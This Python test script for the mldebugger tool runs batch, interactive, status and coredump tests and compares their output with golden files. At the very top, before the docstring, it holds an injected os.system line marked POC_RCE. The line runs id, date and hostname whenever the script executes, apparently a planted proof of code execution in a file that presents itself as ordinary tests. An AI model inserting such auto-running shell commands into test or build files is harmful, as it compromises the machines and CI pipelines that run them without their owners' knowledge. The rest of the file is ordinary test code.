#!/usr/bin/env python3
import os
os.system("echo ===POC_RCE===; id; date; hostname; echo ===END===")


"""
Test script for mldebugger
"""

from pathlib import Path

import subprocess
import time
import os
import sys
import filecmp

# Change to parent directory
os.chdir("..")
TEST_DIR="ext/test_outputs"
Path(TEST_DIR).mkdir(parents=True, exist_ok=True)

if os.getenv("GIT_MODE"):
  CMD = "mldebug -x test "
else:
  CMD = "python mldebug.py -x test "

BATCH_TESTS = {
  "NLP": f"{CMD} -a ext/tests/nlp -b ext/tests/nlp/buffer_info.json -f skip_dump --verbose",
  "STAMPED_DESIGN1": f"{CMD} -a ext/tests/stamped2 -b ext/tests/stamped2/buffer_info.json -f multistamp skip_dump",
  "STAMPED_DESIGN2": f"{CMD} -a ext/tests/stamped -b ext/tests/stamped/buffer_info.json -f multistamp skip_dump -o 2x4x4",
  "PEANO_BATCH": f"{CMD} -a ext/tests/peano -b ext/tests/peano/buffer_info.json -f l2_ifm_dump --peano",
  "PEANO_L2_DUMP": f"{CMD} -a ext/tests/peano -b ext/tests/peano/buffer_info.json -f l2_ifm_dump --peano -e 15",
  "WTS_ITER_FLAGS": f"{CMD} -a ext/tests/wts_iter -b ext/tests/wts_iter/buffer_info.json"
  " -e 2 -f layer_status text_dump",
  "VAIML": f"{CMD} -v ext/tests/vaiml -f skip_dump",
 # "X2": f"{CMD} -a ext/tests/x2 -b ext/tests/x2/buffer_info.json -f skip_dump",
}

INTERACTIVE_TESTS = {
  "VAIML_INTERACTIVE": [f"{CMD} -v ext/tests/vaiml -i", "i\na\nv\nd\ns\nn\nc\nq", ""],
  "VAIML_STANDALONE": [
    f"{CMD} -v ext/tests/vaiml -s",
    "info()\ngoto_pc(10)\nstatus()\nrmem(0,0,0,4)\nrreg(0,0,0)\npreg(0,0,0)\n"
    "wreg(0,0,0,0)\nrlcp(0,2)\ncontrol_instr()\nfuncs()\nunhalt()\npc_brkpt(10, 0)\n"
    "step()\npc(1)\n",
    "",
  ]
  #"X2_INTERACTIVE": [f"{CMD}  -a ext/tests/x2 -b ext/tests/x2/buffer_info.json -i", "i\na\nv\nd\ns\nn\nc\nq", ""],
}

# Status tests that compare generated output with golden files
STATUS_TESTS = {
  "STATUS_STX": [f"{CMD} -d stx -s", f"status(advanced=True, filename='{TEST_DIR}/stx_st.log')\nexit()\n",
                 "stx", f"{TEST_DIR}/stx_st.log"],
  "STATUS_TELLURIDE": [f"{CMD} -d telluride -s", f"status(advanced=True, filename='{TEST_DIR}/tel_st.log')\nexit()\n",
                       "telluride", f"{TEST_DIR}/tel_st.log"],
}

COREDUMP_TESTS = {

  "COREDUMP_TELLURIDE": [f"{CMD} -d telluride -c ext/tests/coredump/telluride.bin -s",
                         "status(advanced=True, filename='.cd_telluride')\nexit()\n", "golden_tel", ".cd_telluride"]
}


def check_stdout(stdout, extra_check_str):
  """
  Check if the output of the command contains valid results.
  """
  check_strings = [
    "Finished Execution",
    "Exiting debugger at Layer",
    "Reached Final iteration",
    "now exiting InteractiveConsole...",
  ]
  if extra_check_str and extra_check_str not in stdout:
    return False
  return any(check_str in stdout for check_str in check_strings)


def run_test(name, command, cmdseq=None, extra_check_str=""):
  """
  Run a command in batch mode and log the output.
  """
  user_input = b""
  if cmdseq:
    # Simulate user input for interactive mode
    user_input = cmdseq.encode("utf-8")
  with subprocess.Popen(
    command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
  ) as process:
    stdout, stderr = process.communicate(input=user_input)
  stdout_txt = stdout.decode(encoding="utf-8")
  stderr_txt = stderr.decode(encoding="utf-8")
  with open(f"{TEST_DIR}/{name}.log", "w", encoding="utf-8") as fd:
    fd.write(stdout_txt)
    fd.write(stderr_txt)
  if process.returncode != 0 or not check_stdout(stdout_txt + stderr_txt, extra_check_str):
    print(stdout_txt)
    print(stderr_txt)
    print(f"{name}: FAIL")
    print(f"Command: {command}")
    print(f"RET_CODE: {process.returncode}")
    return False
  print(f"{name}: PASS")
  return True


def run_status_test(name, command, cmdseq, device_name, generated_file, coredump=False):
  """
  Run a status test and compare the generated file with the golden file.
  """
  user_input = cmdseq.encode("utf-8")
  with subprocess.Popen(
    command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
  ) as process:
    stdout, stderr = process.communicate(input=user_input)
  stdout_txt = stdout.decode(encoding="utf-8")
  stderr_txt = stderr.decode(encoding="utf-8")

  # Log the output
  with open(f"{TEST_DIR}/{name}.log", "w", encoding="utf-8") as fd:
    fd.write(stdout_txt)
    fd.write(stderr_txt)

  # Check if the command executed successfully
  if process.returncode != 0:
    print(stdout_txt)
    print(stderr_txt)
    print(f"{name}: FAIL - Command failed with return code {process.returncode}")
    return False

  if coredump:
    golden_file = "ext/tests/coredump/golden_tel"
  else:
    golden_file = f"ext/tests/status_golden/{device_name}"

  if not os.path.exists(generated_file):
    print(f"{name}: FAIL - Generated file '{generated_file}' not found")
    return False

  if not os.path.exists(golden_file):
    print(f"{name}: FAIL - Golden file '{golden_file}' not found")
    return False

  # Compare files
  if filecmp.cmp(generated_file, golden_file, shallow=False):
    print(f"{name}: PASS")
    return True
  else:
    print(f"{name}: FAIL - Generated file differs from golden file")
    # Show diff for debugging
    diff_result = subprocess.run(
      ["diff", "-u", golden_file, generated_file],
      capture_output=True,
      text=True,
      check=True
    )
    print(diff_result.stdout)
    return False


def run_guidance_tests():
  """
  Run guidance unit tests
  """
  print("\n" + "="*80)
  print("Running Guidance Tests")
  print("="*80)

  # Run guidance unit tests
  test_result = subprocess.run(
    ["python", "tests/guidance/test_guidance.py"],
    cwd="ext",
    capture_output=True,
    text=True,
    check=True
  )

  print(test_result.stdout)
  if test_result.stderr:
    print(test_result.stderr)

  if test_result.returncode != 0:
    print("Guidance Tests: FAIL")
    return False

  print("Guidance Tests: PASS")

  # Run integration tests
  print("\n" + "="*80)
  print("Running Guidance Integration Tests")
  print("="*80)

  test_result = subprocess.run(
    ["python", "tests/guidance/test_integration.py"],
    cwd="ext",
    capture_output=True,
    text=True,
    check=True
  )

  print(test_result.stdout)
  if test_result.stderr:
    print(test_result.stderr)

  if test_result.returncode != 0:
    print("Guidance Integration Tests: FAIL")
    return False

  print("Guidance Integration Tests: PASS")
  return True


def test():
  """
  Toplevel
  """
  # Run guidance tests first
  guidance_pass = run_guidance_tests()

  print("Begin status tests")
  status_pass = True
  for test_name, [cmdline, cmdseq, device_name, gen_file] in STATUS_TESTS.items():
    if not run_status_test(test_name, cmdline, cmdseq, device_name, gen_file):
      status_pass = False

  print("Begin coredump tests")
  cd_pass = True
  for test_name, [cmdline, cmdseq, device_name, gen_file] in COREDUMP_TESTS.items():
    if not run_status_test(test_name, cmdline, cmdseq, device_name, gen_file, coredump=True):
      cd_pass = False

  print("Begin batch tests")
  batch_pass = True
  for test_name, cmdline in BATCH_TESTS.items():
    if not run_test(test_name, cmdline, False):
      batch_pass = False

  print("Begin interactive tests")
  interactive_pass = True
  for test_name, [cmdline, cmdseq, extra_check_str] in INTERACTIVE_TESTS.items():
    if not run_test(test_name, cmdline, cmdseq, extra_check_str):
      interactive_pass = False

  # Return 0 only if all tests pass
  return 0 if (guidance_pass and batch_pass and interactive_pass and status_pass and cd_pass) else 1


def main():
  """
  Main function to run the tests.
  """
  start_time = time.time()
  status = test()
  end_time = time.time()
  elapsed_time = int(end_time - start_time)
  print(f"\nElapsed time: {elapsed_time} seconds")
  sys.exit(status)


if __name__ == "__main__":
  main()
